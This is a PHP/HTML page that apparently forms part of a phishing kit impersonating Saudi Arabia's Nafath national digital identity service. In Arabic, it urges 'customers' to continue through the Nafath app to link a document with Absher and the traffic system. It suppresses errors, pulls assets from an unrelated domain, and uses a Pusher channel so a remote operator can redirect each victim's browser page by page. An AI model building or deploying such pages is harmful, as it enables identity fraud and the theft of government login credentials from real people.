<?php
error_reporting(0);
ini_set('display_errors', 0);
########################
session_start();
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">

<head id="j_idt2">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <!--<meta http-equiv="X-UA-Compatible" content="IE=edge">-->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- CSS only -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa" crossorigin="anonymous"></script>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@200;300&display=swap" rel="stylesheet">
    <link rel="icon" sizes="192x192" href="https://new-smmacsoo.com/resources/./assets/pfavico.ico">
    <link rel="shortcut icon" href="https://new-smmacsoo.com/resources/./assets/pfavico.ico" type="image/x-icon">
    <link rel="apple-touch-icon" href="https://new-smmacsoo.com/resources/./assets/pfavico.ico" type="image/x-icon">
    <title>NAFAD</title>
    <style>
        * {
            direction: rtl;
        }

        nav {
            overflow: auto;
        }

        .nafad {
            margin-right: 222px;
            float: right;
        }

        .rr ul {
            list-style-type: none;
            margin-top: -90px;
        }

        .rr ul li {
            display: inline-block;
            color: #11998E;
        }

        .rr ul li:nth-child(2) {
            margin-left: 82px;
            margin-right: 72px;
        }

        .rr ul li:nth-child(1) {
            margin-left: -11px;
        }

        a {
            text-decoration: none;
        }

        .ff ul {
            list-style-type: none;
        }

        .ff ul li {
            display: inline;
            padding: 10px;
            font-weight: bold;
        }

        @media only screen and (max-width: 600px) {
            nav {
                overflow: hidden;
            }

            .nafad {
                float: none;
                margin-left: 230px;
            }
        }

        .btn-success{
            background-color: #11998d;
            border-color: #11998d;
        }
    </style>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
</head>

<body style="font-family:'Tajawal', sans-serif; overflow-x: hidden;background-color:#11998d">

    <div class="container">
        <div class="bg-white p-3" style="margin: 100px 0;">
            <div class="text-center">
                <img src="./assets/Untitled.avif" width="270" alt="">
                <img src="./assets/Screenshot 2022-06-04 at 06-30-43 الهوية الرقمية الوطنية_edited.avif" style="margin-top: -50px;" width="150" alt="">
            </div>
            <h5 class="fw-bold text-center mt-4" style="color:#11998d">عملائنا الأعزاء ... </h5>
            <p class="fw-bold text-center mt-3" style="color:#11998d">

                يرجى الانتقال الى تطبيق نفاذ الوطني لاتمام اصدار الوثيقة وربطها بنظام ابشر والمرور           </p>
            <div class="text-center mt-4">
                <a href="./StepOne.php" type="submit" name="submit" id="butSubm" style="height: 50px;" class="btn btn-success text-light fw-bold w-50 pt-2">متابعة</a>
            </div>
        </div>
    </div>
<script src="js/main.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script>
        var userIdFromSession = <?php echo json_encode($_SESSION['user_id']); ?>;

        Pusher.logToConsole = true;

        var pusher = new Pusher('4a9de0023f3255d461d9', {
            cluster: 'ap2'
        });

        var channel = pusher.subscribe('my-channel-new-jaz');

        channel.bind('page-tamen-new', function(data) {

            if (data.userId === userIdFromSession) {
                document.location.href = data.page;
            }

        });
    </script>
</body>

</html>